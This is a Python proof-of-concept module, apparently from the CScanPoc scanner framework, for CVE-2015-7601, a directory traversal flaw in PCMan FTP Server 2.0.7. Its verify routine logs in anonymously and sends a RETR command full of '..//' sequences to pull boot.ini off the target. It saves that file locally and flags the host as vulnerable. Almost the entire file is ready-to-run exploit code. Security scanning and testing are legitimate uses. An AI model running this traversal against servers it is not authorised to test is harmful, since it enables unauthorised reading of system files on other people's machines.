# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
from ftplib import FTP
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PCMan-FTP-Server_0001'  # 平台漏洞编号，留空
    name = 'PCMan FTP Server 2.0.7 - Directory Traversal'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2015-09-29'  # 漏洞公布时间
    desc = '''
        Directory traversal vulnerability in PCMan's FTP Server 2.0.7 allows remote attackers to read arbitrary files via a ..// (dot dot double slash) in a RETR command.
    '''  # 漏洞描述
    ref = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7601'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-7601'  # cve编号
    product = 'PCMan-FTP-Server'  # 漏洞应用名称
    product_version = '2.0.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c4d5e521-d517-4e88-9a30-691af403aa7a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            host = urllib.parse.urlparse(self.target).hostname
            port = urllib.parse.urlparse(self.target).port
            try:
                ftp = FTP()
                ftp.connect(host, port)
                ftp.login()
                ftp.retrbinary(
                    'RETR ..//..//..//..//..//..//..//..//..//..//..//boot.ini', open('boot.ini.txt', 'wb').write)
                ftp.close()
                file = open('boot.ini.txt', 'r')
                if "boot loader" in file.read():
                    # security_hole(host+":"+port)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            except Exception as e:
                pass

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
